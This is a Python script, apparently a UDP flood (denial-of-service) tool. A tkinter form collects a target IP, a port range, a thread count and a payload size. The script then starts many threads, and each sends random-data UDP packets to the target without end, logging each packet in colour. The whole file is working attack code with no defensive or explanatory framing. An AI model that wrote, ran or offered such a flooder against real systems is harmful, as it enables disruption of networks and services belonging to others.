import socket, threading, random, time, string, tkinter
from colorama import Fore, Back, Style
from datetime import date

status_colors = {
    "+": Fore.GREEN,            # Success
    "-": Fore.RED,              # Failure
    "*": Fore.YELLOW,           # Warning
    ":": Fore.CYAN,             # Info
    " ": Fore.WHITE             # Normal
}

def display(status, data):
    print(f"{status_colors[status]}[{status}] {Fore.BLUE}[{date.today()} {time.strftime('%H:%M:%S', time.localtime())}] {status_colors[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}")
def gui_input(**args):
    data, warning = {}, True
    def warning(window):
        warning_label = tkinter.Label(master=window, text="Please Enter Valid Data")
        warning_label.pack(side=tkinter.BOTTOM)
    def check(window, entries):
        nonlocal data, warning
        for index, entry in enumerate(entries):
            data[list(args.keys())[index]] = entry.get()
            if list(args.values())[index][0] == int:
                try:
                    data[list(args.keys())[index]] = int(data[list(args.keys())[index]])
                except ValueError:
                    if warning:
                        warning(window)
                        warning = False
                        return
            elif list(args.values())[index][0] == float:
                try:
                    data[list(args.keys())[index]] = float(data[list(args.keys())[index]])
                except ValueError:
                    if warning:
                        warning(window)
                        warning = False
                        return
            elif data[list(args.keys())[index]] == "":
                return
        window.destroy()
    input_window = tkinter.Tk()
    input_window.title = "Enter Values"
    input_window.geometry(f"{int(input_window.winfo_screenwidth()*0.5)}x{(len(args)+3)*20}")
    labels, entries = [], []
    for index, input_field in enumerate(args.keys()):
        labels.append(tkinter.Label(master=input_window, text=input_field))
        entries.append(tkinter.Entry(master=input_window, width=int(input_window.winfo_screenwidth()*0.25)))
        entries[index].insert(0, args[input_field][1])
        labels[index].place(x=0, y=index*20)
        entries[index].place(x=int(input_window.winfo_screenwidth()*0.25), y=index*20)
    submit_button = tkinter.Button(master=input_window, text="SUBMIT", command=lambda: check(input_window, entries))
    submit_button.pack(side=tkinter.BOTTOM)
    input_window.mainloop()
    return data
def attack(target_ip, port, socket_type, message_len, message_multiplier):
    garbage = str(''.join((random.choices(string.ascii_letters, k=message_len)))*message_multiplier).encode()
    while True:
        with socket.socket(socket_type, socket.SOCK_DGRAM) as connection:
            connection.connect((target_ip, port))
            connection.sendto(garbage, (target_ip, port))
            display('+', f"Send Packet to {Back.RED}{target_ip}:{port}{Back.RESET}")

if __name__ == "__main__":
    data = gui_input(Target_IP=(str, "0.0.0.0"), Starting_Port=(int, "80"), Ending_Port=(int, "80"), Threads=(int, "100"), Message_Size=(int, "10"), Message_Multiplier=(int, "100"))
    if '.' in data["Target_IP"]:
        socket_type = socket.AF_INET
    else:
        socket_type = socket.AF_INET6
    print(data["Threads"])
    for i in range(data["Threads"]):
        for port in range(data["Starting_Port"], data["Ending_Port"]+1):
            thread = threading.Thread(target=lambda: attack(data["Target_IP"], port, socket_type, data["Message_Size"], data["Message_Multiplier"]))
            thread.start()